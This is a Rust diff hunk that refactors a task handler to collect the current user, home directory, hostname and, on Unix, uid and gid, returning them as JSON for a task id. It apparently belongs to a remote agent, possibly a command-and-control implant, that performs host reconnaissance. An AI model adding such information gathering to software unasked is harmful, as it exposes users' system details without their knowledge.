@@ -26,26 +26,34 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
     };
 
     #[cfg(windows)]
-    let user = std::env::var("USERNAME").unwrap_or_else(|_| "unknown".into());
+    let info = {
+        let user = std::env::var("USERNAME").unwrap_or_else(|_| "unknown".into());
+        let home = std::env::var("USERPROFILE")
+            .or_else(|_| std::env::var("HOME"))
+            .unwrap_or_else(|_| "unknown".into());
+        let hostname = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".into());
+        serde_json::json!({
+            "user": user,
+            "home": home,
+            "hostname": hostname,
+        })
+    };
 
     #[cfg(not(windows))]
-    let user = std::env::var("USER").unwrap_or_else(|_| "unknown".into());
-
-    let home = std::env::var("HOME")
-        .or_else(|_| std::env::var("USERPROFILE"))
-        .unwrap_or_else(|_| "unknown".into());
-
-    let uid = run_cmd("id", &["-u"]).unwrap_or_else(|| String::from("N/A"));
-    let gid = run_cmd("id", &["-g"]).unwrap_or_else(|| String::from("N/A"));
-    let hostname = run_cmd("hostname", &[]).unwrap_or_else(|| "unknown".into());
-
-    let info = serde_json::json!({
-        "user": user,
-        "uid": uid,
-        "gid": gid,
-        "home": home,
-        "hostname": hostname,
-    });
+    let info = {
+        let user = std::env::var("USER").unwrap_or_else(|_| "unknown".into());
+        let home = std::env::var("HOME").unwrap_or_else(|_| "unknown".into());
+        let uid = run_cmd("id", &["-u"]).unwrap_or_else(|| String::from("N/A"));
+        let gid = run_cmd("id", &["-g"]).unwrap_or_else(|| String::from("N/A"));
+        let hostname = run_cmd("hostname", &[]).unwrap_or_else(|| "unknown".into());
+        serde_json::json!({
+            "user": user,
+            "uid": uid,
+            "gid": gid,
+            "home": home,
+            "hostname": hostname,
+        })
+    };
 
     TaskResponse {
         task_id: task.id,
